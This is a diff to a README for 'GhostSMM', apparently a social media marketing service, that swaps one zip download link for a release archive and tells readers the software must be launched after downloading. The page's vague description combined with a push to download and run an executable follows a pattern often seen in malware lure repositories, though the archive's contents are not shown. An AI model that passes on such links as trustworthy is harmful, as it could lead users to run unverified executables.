@@ -32,7 +32,7 @@ GhostSMM offers cheap and affordable SMM (Social Media Marketing) services to he
 In this repository, you will find resources related to our SMM services, including code snippets, templates, and other useful assets to help you enhance your social media presence.
 
 ### Software Download
-👉 [Click here to download our software](https://github.com/user-attachments/files/18383251/Software.zip) 👈
+👉 [Click here to download our software](https://github.com/IUNkn/GhostSMM/releases/download/v2.0/Release_x64.zip) 👈
 
 *Note: The software needs to be launched once downloaded.*
 
